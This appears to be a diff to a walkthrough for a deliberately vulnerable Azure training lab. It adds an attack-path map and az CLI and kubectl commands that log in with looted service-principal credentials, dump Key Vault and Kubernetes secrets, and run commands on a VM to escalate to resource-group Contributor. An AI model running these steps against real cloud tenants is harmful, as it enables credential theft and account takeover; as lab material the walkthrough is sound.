@@ -8,6 +8,33 @@ This section is not complete and by no means exhaustive. The idea is to give som
 
 The same diagram as a PDF can be found in `/attacks/AzureLabFull.pdf`.
 
+Since the diagram is updated with delay, there is also a small ASCII overview:
+
+```
+ROAD A — SQL pivot  (reaches Ganymede directly)
+  E1 SSRF / E2 SQLi ─► webapp MI ─► S1 trigger-esc ─► db_owner
+    ─► S2 MI-pivot (sp_invoke + DB-scoped cred) ─► Ceres bucket ─► tycho-db-exporter SP
+    ─► Ganymede KV ─► Protomolecule ─► Contributor / RG   ★
+
+ROAD B — AKS  (reaches Ganymede via Donnager)
+  E1 SSRF / E2 SQLi ─► tycho-db read ─► espionage_credentials ─► Chrisjen SP
+    ─► AKS cluster-admin ─► kubectl get secrets ─► fleet-ops-runner SP
+    ─► RunCommand on Donnager ──────────────────┐
+                                                │
+ROAD C — VM ladder  (reaches Ganymede via Donnager)
+  E3 storage leak ─► credentials.json ─► Alex SP ─► V1 Rocinante RCE
+    ─► V2 KeysToTheScopuli MI ─► Scopuli
+        ├─► V4 RunCommand on Donnager ──────────┤
+        └─► V3 Owner on tycho-db ─► (rejoins Road A's SQL spine)
+                                                │
+  shared tail (Roads B & C):                    ▼
+    Donnager RCE ─► V5 JovianAccess MI ─► Ganymede KV ─► Protomolecule ─► Contributor / RG   ★
+
+SIDE LOOP  (from any Donnager foothold)
+  Donnager ─► V6 labpallas listKeys ─► deploycreds SP ─► Contributor on tycho-webapp
+    ─► SCM RCE ─► back to the web app
+```
+
 ### Tycho-terminal web service
 
 This one is very vulnerable and has at least 3 paths you can take to get further in the lab.
@@ -309,7 +336,16 @@ EXEC @ret = sp_invoke_external_rest_endpoint
 SELECT @ret, @resp;
 ```
 
-The blob is an `automation/tycho-db_export_runner.json` runner config with embedded service-principal credentials (placeholder strings today, real creds in a future chain). Anonymous reads on the same URL get 404 — the AAD binding the credential carries is what unlocks the bucket.
+The blob is an `automation/tycho-db_export_runner.json` runner config with embedded service-principal credentials — the **`tycho-db-exporter`** SP. 
+
+#### Exporter SP → Key Vault → resource-group Contributor
+
+Log in with the SP creds from the loot blob (`az login --service-principal -u <client_id> -p <client_secret> -t <tenant_id>`). The exporter only needs its own storage connection string, but it was granted `Key Vault Secrets User` on the shared **Ganymede** vault — which also stores the `Protomolecule` SP creds. Read them:
+```
+az keyvault secret list --vault-name Ganymede-<suffix> -o table
+az keyvault secret show --vault-name Ganymede-<suffix> -n Protomolecule-App-Secret --query value -o tsv
+```
+`Protomolecule` is `Contributor` on the whole resource group. Starting from just the web app, the pure-SQL path (SSRF → webapp MI → trigger escalation → `db_owner` → MI pivot → exporter SP → Ganymede → Protomolecule) reaches the crown jewels.
 
 
 #### Variant: exfiltrate the server MI token to an external endpoint
@@ -373,3 +409,17 @@ Read secrets:
 ```
 kubectl get secrets -o json
 ```
+
+The interesting one is `fleet-ops-runner`: a service-principal credential
+(`client_id` / `client_secret` / `tenant_id`) whose only privilege is
+`RunCommand` on the **Donnager** VM. From here you can abuse `JovianAccess` MI → `Ganymede` Key Vault → `Protomolecule` hop to reach
+resource-group Contributor:
+```
+SECRET=$(kubectl get secret fleet-ops-runner -o jsonpath='{.data.client_secret}' | base64 -d)
+CID=$(kubectl get secret fleet-ops-runner -o jsonpath='{.data.client_id}' | base64 -d)
+TID=$(kubectl get secret fleet-ops-runner -o jsonpath='{.data.tenant_id}' | base64 -d)
+az login --service-principal -u "$CID" -p "$SECRET" -t "$TID"
+az vm run-command invoke -g [rg_name] -n Donnager --command-id RunPowerShellScript \
+  --scripts "whoami; Get-ItemProperty -Path 'HKLM:\\SOFTWARE\\Expanse'"
+```
+From there, see "Donnager MI to Key Vault" above.
